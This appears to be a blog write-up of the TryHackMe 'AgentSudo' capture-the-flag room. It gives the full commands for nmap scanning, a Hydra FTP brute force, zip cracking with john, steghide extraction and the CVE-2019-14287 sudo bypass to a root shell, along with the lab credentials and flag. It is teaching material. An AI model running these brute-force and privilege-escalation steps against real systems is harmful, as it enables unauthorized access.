---
layout: post
title: "AgentSudo"
date: 2025-04-15 06:11:00 +0530
author: s0c41dgvns 
categories: [CTF, TryHackMe]
tags: [Pentesting, CTF, TryHackMe, AgentSudo]
---


Target IP: 10.10.88.175

## Nmap Scan for open ports

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sS -sV -p- 10.10.88.175 -vv -T5
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-28 06:11 EDT
NSE: Loaded 46 scripts for scanning.
Initiating Ping Scan at 06:11
Scanning 10.10.88.175 [4 ports]
Completed Ping Scan at 06:11, 0.44s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 06:11
Completed Parallel DNS resolution of 1 host. at 06:11, 0.01s elapsed
Initiating SYN Stealth Scan at 06:11
Scanning 10.10.88.175 [65535 ports]
Discovered open port 80/tcp on 10.10.88.175
Discovered open port 21/tcp on 10.10.88.175
Discovered open port 22/tcp on 10.10.88.175
Warning: 10.10.88.175 giving up on port because retransmission cap hit (2).

```

## Performing aggressive scan on those three ports

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p21,22,80 -A 10.10.88.175      
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-28 06:12 EDT
Nmap scan report for 10.10.88.175
Host is up (0.55s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Annoucement
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.50 seconds

```

There is no info regarding FTP username or password, and the same goes with ssh also.

So, our next aim should be getting the info from Website

> 
> 
> 
> Dear agents,
> 
> Use your own codename as user-agent to access the site.
> 
> From,
> Agent R
> 

Changing the user-agent field in the Request using Burp might help.

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/215e97e2-f86c-4b06-9922-4d50db0a780f/a3704156-391a-4454-af31-40e84594c94e/Untitled.png)

[]()

> With User-agent: C, we get redirected to /agent_C_attention.php, where we have a message:
> 
> 
> Attention chris,
> 
> Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!
> 
> From,
> Agent R
> 

Since, it is said as weak, that means we can use rockyou.txt to crackit.

### Bruteforcing the ftp login using Hydra

```bash
┌──(kali㉿kali)-[~]
└─$ hydra -l chris -P /usr/share/wordlists/rockyou.txt    ftp://10.10.88.175            
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-07-28 06:43:20
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.88.175:21/
[STATUS] 209.00 tries/min, 209 tries in 00:01h, 14344190 to do in 1143:53h, 16 active
[21][ftp] host: 10.10.88.175   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-07-28 06:44:45

```

<aside>
🔥 login: chris   password: crystal

</aside>

Now, login into that using ftp

```bash
┌──(kali㉿kali)-[~]
└─$ ftp 10.10.88.175
username: chris
password crystal
```

> You can use mget * to download all the files at once.
> 

```bash
┌──(kali㉿kali)-[~/tryhackme/agentSudo]
└─$ ls
cute-alien.jpg  cutie.png  To_agentJ.txt

```

```bash
┌──(kali㉿kali)-[~/tryhackme/agentSudo]
└─$ cat To_agentJ.txt 
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C

```

That means we have our job pending that is to do steganography.

### Checking all the files.

```bash
┌──(kali㉿kali)-[~/tryhackme/agentSudo]
└─$ file *                
cute-alien.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 96x96, segment length 16, baseline, precision 8, 440x501, components 3
cutie.png:      PNG image data, 528 x 528, 8-bit colormap, non-interlaced
To_agentJ.txt:  ASCII text

```

### Applying binwalk on those pics

```bash
┌──(kali㉿kali)-[~/tryhackme/agentSudo]
└─$ binwalk cute-alien.jpg 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01

                                                                                                                         
┌──(kali㉿kali)-[~/tryhackme/agentSudo]
└─$ binwalk cutie.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22

```

### Cracking the ZIP pass

Extracting the zip from that png using Binwalk.

```bash
┌──(kali㉿kali)-[~/tryhackme/agentSudo]
└─$ binwalk cutie.png -e

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression

WARNING: Extractor.execute failed to run external extractor 'jar xvf '%e'': [Errno 2] No such file or directory: 'jar', 'jar xvf '%e'' might not be installed correctly
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22

```

Now, cracking the password

```bash
┌──(kali㉿kali)-[~/tryhackme/agentSudo]
└─$ cd _cutie.png.extracted 
                                                                                                                         
┌──(kali㉿kali)-[~/tryhackme/agentSudo/_cutie.png.extracted]
└─$ ls
365  365.zlib  8702.zip

```

```bash
┌──(kali㉿kali)-[~/tryhackme/agentSudo/_cutie.png.extracted]
└─$ zip2john 8702.zip > output.txt
                                                                                                                         
┌──(kali㉿kali)-[~/tryhackme/agentSudo/_cutie.png.extracted]
└─$ john output.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 AVX 4x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 6 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
alien            (8702.zip/To_agentR.txt)     
1g 0:00:00:43 DONE 2/3 (2024-07-28 07:02) 0.02284g/s 992.0p/s 992.0c/s 992.0C/s 123456..Open
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Now, extracting that 8702.zip 

```bash
	7z e 802.zip
	
	password: alien
	
```

```bash
┌──(kali㉿kali)-[~/tryhackme/agentSudo/_cutie.png.extracted]
└─$ cat To_agentR.txt
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
                                                                                                                         
# Decoding the base64 text
                                                                                                                         
┌──(kali㉿kali)-[~/tryhackme/agentSudo/_cutie.png.extracted]
└─$ echo "QXJlYTUx" | base64 -d
Area51   
```

now, this could be something that comes into handy at cute-alien.png.

```bash
┌──(kali㉿kali)-[~/tryhackme/agentSudo]
└─$ steghide --extract -sf cute-alien.jpg  
Enter passphrase: Area51
wrote extracted data to "message.txt".
                                                                                                                         
┌──(kali㉿kali)-[~/tryhackme/agentSudo]
└─$ ls
cute-alien.jpg  cutie.png  _cutie.png.extracted  message.txt  To_agentJ.txt
                                                                                                                         
┌──(kali㉿kali)-[~/tryhackme/agentSudo]
└─$ cat message.txt  
Hi james,

Glad you find this message. Your login password is hackerrules!

Don\'t ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
                                                                                                                         
┌──(kali㉿kali)-[~/tryhackme/agentSudo]
└─$ ssh james@10.10.88.175 -P hackerrules!          
The authenticity of host \'10.10.88.175 (10.10.88.175) cant be established.
ED25519 key fingerprint is SHA256:rt6rNpPo1pGMkl4PRRE7NaQKAHV+UNkS9BfrCy8jVCA.
This key is not known by any other names.
Are you sure you want to \continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added \'10.10.88.175\' (ED25519) to the list of known hosts.
james@10.10.88.175's password: hackerruels!

```

<aside>
🔥 uname: james pass: hackerrules!

</aside>

## **Privilege escalation**

We checked for the permission the user has with “sudo -l” command.

![](https://miro.medium.com/v2/resize:fit:875/1*mdUMVLX4a4JZ1UXETEq1vA.png)

It looks like our user is not allowed to run /bin/bash as root since we have a ! root. However, this looks weird as the first all means our user can run /bin/bash as any user. This is interesting, perhaps we can find a way to exploit this.

As luck would have it, a google search returns us something we might be able to use to gain root privileges.

We searched on google, and we got a vulnerability for Sudo for version 1.8, so we checked the version of sudo.

![](https://miro.medium.com/v2/resize:fit:875/1*pazfmqeTKgAKAwxsbRoX_Q.png)

```bash
**sudo -V**
```

![](https://miro.medium.com/v2/resize:fit:403/1*bBPNYaJ-M3Pc9kC_Ck6yGg.png)

According to https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14287

In Sudo before 1.8.28, an attacker with access to a Runas ALL sudoer account can bypass certain policy blacklists and session PAM modules and can cause incorrect logging by invoking sudo with a crafted user ID. For example, this allows bypass of! root configuration, and USER= logging, for a sudo -u \#$((0xffffffff)) command.

Our sudo version is lower than 1.8.28, so we can exploit the machine. Using the exploit we found, we can indeed spawn a root shell and get our root flag.

**sudo -u#-1 /bin/bash**

![](https://miro.medium.com/v2/resize:fit:430/1*cmXotFcgqUff3vysAcwzuQ.png)

We are root now!

**cd /root**

**ls**

**cat root.txt**

![](https://miro.medium.com/v2/resize:fit:875/1*cDrDbcCLW9PRK2bsa9NJfQ.png)

**b53a02f55b57d4439e3341834d70c062s**

**Done!!!!!!**